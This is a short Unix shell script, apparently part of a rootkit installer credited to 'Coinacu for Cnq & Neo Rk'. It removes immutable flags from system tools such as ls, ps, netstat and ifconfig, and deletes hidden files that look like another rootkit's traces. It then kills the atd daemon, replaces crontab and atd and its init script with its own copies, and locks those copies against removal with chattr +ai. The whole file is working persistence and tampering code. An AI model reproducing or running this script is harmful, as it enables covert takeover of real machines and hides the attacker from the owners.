#!/bin/sh
#script by Coinacu for Cnq & Neo Rk

ls="/bin/ls"
tcpd="/usr/sbin/tcpd"
netstat="/bin/netstat"
ps="/bin/ps"
pstree="/usr/bin/pstree"
top="/usr/bin/top"
ifconfig="/sbin/ifconfig"
cron="/usr/bin/crontab"
cro="crontab"
atd="/usr/sbin/atd"
satd="/etc/rc.d/init.d/atd"
so="/lib/.so"
sso="/lib/.sso"
proc="/dev/ptyxx/.proc"

chattr -ai $ls
chattr -ai $netstat
chattr -ai $ps
chattr -ai $pstree
chattr -ai $top   
chattr -ai $tcpd
chattr -ai $ifconfig

if [ -f $so ]; then

chattr -ai $so
rm -rf $so
fi                    

if [ -f $sso ]; then

chattr -ai $sso
rm -rf $sso
fi

if [ -f $proc ]; then

chattr -ai $proc
rm -rf $proc
fi

if [ -f $cron ]; then
chattr -ai $cron
rm -rf $cron
mv -f $cro $cron

fi

if [ -f $atd ]; then

killall -9 atd

rm -rf $atd
mv -f atd $atd
rm -rf $satd
mv -f atd2 $satd
chattr +ai $atd
chattr +ai $satd

fi

